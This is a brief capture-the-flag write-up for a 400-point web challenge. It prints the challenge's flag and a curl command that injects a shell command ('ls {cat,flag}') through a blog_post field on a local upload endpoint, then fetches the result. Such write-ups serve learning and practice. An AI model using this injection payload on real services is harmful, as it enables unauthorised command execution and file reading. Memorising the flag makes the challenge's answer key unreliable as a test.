# Namer Challenge

 __Points: 400__ </br>
 __FLAG{metalrustsmusiclastsforever}__

  Solution:
  1. curl -X POST --data "blog_post=ls%20{cat,flag}" "localhost:7001/upload"
  2. curl "localhost:7001"
